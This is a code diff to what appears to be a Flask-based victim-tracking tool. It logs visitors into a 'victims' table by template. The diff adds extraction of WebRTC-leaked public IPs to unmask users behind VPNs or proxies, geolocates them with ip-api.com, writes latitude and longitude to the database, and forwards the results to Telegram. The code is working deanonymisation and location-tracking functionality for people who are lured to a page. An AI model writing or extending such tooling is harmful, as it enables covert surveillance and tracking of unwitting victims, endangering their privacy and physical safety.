@@ -3,6 +3,8 @@ import sqlite3
 import json
 import base64
 import requests
+import ipaddress
+import re
 from flask import Flask, render_template, request, jsonify, send_from_directory, Response, redirect
 from functools import wraps
 import telegram_api
@@ -324,20 +326,50 @@ def info_handler(tpl_name):
             conn.execute("INSERT INTO victims (template, ip, os, browser, status) VALUES (?, ?, ?, ?, ?)",
                          (tpl_name, ip, dev_info['os'], dev_info['browser'], 'Connected'))
     
-    # Try fetching IP geolocation via API
+    # Try fetching IP geolocation via API (Uses WebRTC leak if public, else standard IP)
+    target_ip = ip
+    webrtc_str = dev_info.get('webrtc', '')
+    if webrtc_str and webrtc_str != 'Not Available':
+        found_ips = re.findall(r'[0-9]+(?:\.[0-9]+){3}|(?:[a-f0-9]{1,4}:){7}[a-f0-9]{1,4}', webrtc_str)
+        for w_ip in found_ips:
+            try:
+                ip_obj = ipaddress.ip_address(w_ip)
+                if not ip_obj.is_private and not ip_obj.is_loopback and not ip_obj.is_link_local:
+                    target_ip = str(ip_obj)
+                    break
+            except ValueError:
+                pass
+
     try:
-        req = requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
+        req = requests.get(f'http://ip-api.com/json/{target_ip}', timeout=3)
         if req.status_code == 200:
             ip_data = req.json()
             if ip_data.get('status') == 'success':
                 ip_info = {
-                    'continent': ip_data.get('timezone', '').split('/')[0],
+                    'target_ip_used': target_ip,
+                    'continent': ip_data.get('timezone', '').split('/')[0] if 'timezone' in ip_data else '',
                     'country': ip_data.get('country', ''),
                     'region': ip_data.get('regionName', ''),
                     'city': ip_data.get('city', ''),
                     'org': ip_data.get('org', ''),
-                    'isp': ip_data.get('isp', '')
+                    'isp': ip_data.get('isp', ''),
+                    'lat': ip_data.get('lat', ''),
+                    'lon': ip_data.get('lon', '')
                 }
+                
+                # Update DB with IP location immediately
+                if ip_info['lat'] and ip_info['lon']:
+                    with sqlite3.connect(DB_FILE) as conn:
+                        conn.execute("""
+                            UPDATE victims 
+                            SET lat=?, lon=?, acc=?, status=? 
+                            WHERE id = (
+                                SELECT id FROM victims 
+                                WHERE ip=? AND template=? 
+                                ORDER BY id DESC LIMIT 1
+                            )
+                        """, (ip_info['lat'], ip_info['lon'], "IP/WebRTC (Approx)", "IP Geolocated", ip, tpl_name))
+                        
                 send_tg(ip_info, 'ip_info')
     except:
         pass
